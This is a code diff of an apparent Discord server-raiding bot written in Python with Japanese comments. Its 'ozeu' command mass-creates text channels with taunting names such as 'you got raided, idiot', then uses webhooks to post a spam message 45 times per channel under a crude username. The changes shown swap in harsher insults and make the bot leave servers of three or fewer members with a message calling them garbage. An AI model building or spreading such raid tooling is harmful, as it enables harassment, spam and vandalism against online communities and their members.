@@ -192,7 +192,7 @@ async def ozeu(ctx, guild_id: str = None):
     # --- チャンネル作成関数 ---
     async def create_channel(i):
         try:
-            return await guild.create_text_channel(name="馬鹿がｗ")
+            return await guild.create_text_channel(name="荒らされてやんのｗバカがｗｗ")
         except Exception as e:
             print(f"[ozeu] {i+1}個目のチャンネル作成失敗: {e}")
             return None
@@ -205,7 +205,7 @@ async def ozeu(ctx, guild_id: str = None):
         try:
             webhook = await channel.create_webhook(name="ZPRWebhook")
             for _ in range(45):
-                await webhook.send(SPAM_MESSAGE, username="馬鹿めｗ")
+                await webhook.send(SPAM_MESSAGE, username="おちんちん")
         except Exception as e:
             print(f"[ozeu] {channel.name} のWebhook送信でエラー: {e}")
 
@@ -478,11 +478,11 @@ async def on_guild_join(guild: discord.Guild):
     print(f"参加サーバー: {guild.name} メンバー数: {guild.member_count}")
 
     # メンバー数5人以下なら即退出し通知を送る
-    if guild.member_count <= 5:
+    if guild.member_count <= 3:
         try:
             await guild.leave()
             embed = discord.Embed(
-                title="🚪 5人以下サーバーのためBotが退出しました",
+                title="🚪ゴミカスサーバーのためBotが退出しました",
                 description=(
                     f"サーバー名: {guild.name} (ID: {guild.id})\n"
                     f"メンバー数: {guild.member_count}"
